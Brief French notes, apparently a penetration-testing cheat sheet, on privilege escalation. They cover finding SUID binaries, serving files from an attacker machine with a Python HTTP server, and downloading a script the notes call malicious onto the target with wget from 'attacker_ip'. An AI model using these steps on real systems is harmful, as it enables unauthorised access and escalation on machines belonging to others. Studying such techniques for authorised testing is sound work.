Pour checker les binaires/fichiers SUID, lancer la commande:
```bash
`find / -perm -u=s -type f 2>/dev/null`
```
Aussi, il se pourrait que la machine cible soit incapable d'effectuer certaines actions, il faudra donc les faire sur notre machine hôte.  Ensuite, il faudra déployer un serveur python pour rendre l'installation possible par la cible
```bash
python -m http.server 8000
``` 
Cette commande crée un server python dans le dossier actuel, et s'ouvre au port 8000 (celui qui est spécifié ici)
 Une fois le serveur python déployé, on peut télécharger le script malveillant sur la machine cible en lancant dans le **terminal de la cible:**
 ```bash
 wget http://attacker_ip:8000/file.txt
 ```
 
**Conseil:** Pour checker les permissions du dossier actuel, fais ``` ls -ld .```
Utiliser https://medium.com pour avoir des références pour les payloads.        
